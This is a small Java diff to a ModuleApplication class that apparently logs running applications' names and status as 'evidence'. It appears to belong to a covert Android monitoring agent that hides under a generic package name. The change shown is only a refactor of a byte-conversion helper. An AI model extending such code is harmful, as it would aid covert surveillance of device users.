@@ -23,9 +23,9 @@ import com.android.networking.evidence.EvidenceType;
 import com.android.networking.interfaces.IncrementalLog;
 import com.android.networking.interfaces.Observer;
 import com.android.networking.listener.ListenerProcess;
+import com.android.networking.util.ByteArray;
 import com.android.networking.util.Check;
 import com.android.networking.util.DateTime;
-import com.android.networking.util.Utils;
 import com.android.networking.util.WChar;
 
 public class ModuleApplication extends BaseModule implements IncrementalLog, Observer<ProcessInfo> {
@@ -83,7 +83,7 @@ public class ModuleApplication extends BaseModule implements IncrementalLog, Obs
 		items.add(WChar.getBytes(name, true));
 		items.add(WChar.getBytes(status.name(), true));
 		items.add(WChar.getBytes(module, true));
-		items.add(Utils.intToByteArray(Evidence.E_DELIMITER));
+		items.add(ByteArray.intToByteArray(Evidence.E_DELIMITER));
 
 		if (Cfg.DEBUG) {
 			Check.asserts(logIncremental != null, "null log"); //$NON-NLS-1$
